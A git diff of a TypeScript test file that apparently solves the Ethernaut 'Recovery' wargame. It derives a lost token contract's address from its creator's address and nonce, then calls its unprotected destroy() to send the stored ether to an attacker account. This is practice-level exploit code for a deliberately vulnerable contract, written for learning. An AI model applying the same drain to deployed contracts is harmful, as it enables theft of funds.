@@ -1,6 +1,5 @@
 
-import { accounts, contract, web3 } from '@openzeppelin/test-environment';
-import assert = require('assert');
+import { accounts, contract } from '@openzeppelin/test-environment';
 
 // Addresses
 const [
@@ -10,33 +9,28 @@ const [
 
 // Loads contracts
 const Recovery = contract.fromArtifact('Recovery');
-//const GatekeeperTwoAttack = contract.fromArtifact('GatekeeperTwoAttack');
+const RecoveryAttack = contract.fromArtifact('RecoveryAttack');
+const SimpleToken = contract.fromArtifact('SimpleToken');
 let recovery: any;
-//let gatekeeperTwoAttack: any;
+let recoveryAttack: any;
+let simpleToken: any;
 
 beforeEach(async () => {
     recovery = await Recovery.new(attacker, { from: owner });
+    recoveryAttack = await RecoveryAttack.new({ from: attacker });
 });
 
-it.only('Recovery -> recover (or remove) the 0.5 ether from the lost contract address', async () => {
-    
+it('Recovery -> recover (or remove) the 0.5 ether from the lost contract address', async () => {
+
+    // The recovery creates a new SimpleToken contract, but the address is unknown
     await recovery.generateToken('Tokenin', 50, { from: owner });
-    console.log('token addr:', await recovery.con.call());
 
+    // Function addressFrom() returns a new address given an existing address and nonce
+    const simpleTokenAddress = await recoveryAttack.addressFrom(recovery.address, 1);
 
-    // const data = web3.eth.abi.encodeFunctionCall({
-    //     name: 'destroy',
-    //     type: 'function',
-    //     inputs: [{
-    //         type: 'address',
-    //         name: '_to'
-    //     }]
-    // }, [owner]);
+    // Access to the SimpleToken contract
+    simpleToken = await SimpleToken.at(simpleTokenAddress);
 
-    // await web3.eth.sendTransaction({
-    //     to: con,
-    //     from: owner,
-    //     data: data
-    // });
-
+    // Destroy SimpleToken contract
+    await simpleToken.destroy(attacker);
 });
